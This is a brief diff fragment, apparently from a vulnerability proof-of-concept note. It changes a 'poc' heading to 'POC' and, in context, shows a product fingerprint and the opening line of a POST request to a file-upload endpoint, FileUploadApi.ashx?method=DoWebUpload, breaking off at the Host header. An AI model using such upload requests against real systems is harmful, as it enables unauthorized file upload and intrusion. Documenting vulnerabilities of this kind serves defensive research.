@@ -7,7 +7,7 @@
 body="/Resource/Scripts/Yw/Yw_Bootstrap.js"
 ```
 
-## poc
+## POC
 ```javascript
 POST /Api/FileUploadApi.ashx?method=DoWebUpload HTTP/1.1
 Host: 
